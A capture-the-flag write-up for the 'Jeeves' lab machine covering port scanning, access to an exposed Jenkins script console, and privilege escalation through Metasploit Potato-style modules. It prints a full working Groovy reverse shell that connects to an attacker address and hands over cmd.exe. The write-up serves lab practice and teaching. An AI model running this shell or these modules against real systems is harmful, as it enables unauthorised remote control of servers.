# Jeeves

### Reconnaissance

- port 80/tcp HTTP Microsoft IIS httpd 10.0
- port 135/tcp MSRPC Microsoft Windows RPC
- port 445/tcp SMB Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
- port 50000/tcp HTTP Jetty 9.4.z-SNAPSHOT

**Directory enumeration**

- port 80
index.html
error.html

- port 50000
askjeeves -> jenkins dashboard

### Exploitation

The jenkins dashboard allows us to run a script, we can use this Groovy reverse shell to gain RCE on the 
target:

```
String host="10.10.10.10";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Privilege Escalation

Upload a meterpreter reverse shell or use exploit/multi/script/web_delivery to generate a powershell command 
for a reverse meterpreter shell.

Running Windows Exploit Suggester or local exploit suggester shows the target is vulnerable to Potato attacks

Background the meterpreter shell and use exploit/windows/local/ms16_075_reflection_juicy to get a system shell

The root flag is hidden in an Alternate Data Stream (ADS) and can be found with `dir /R` and read with
`more < ADS_value_here`
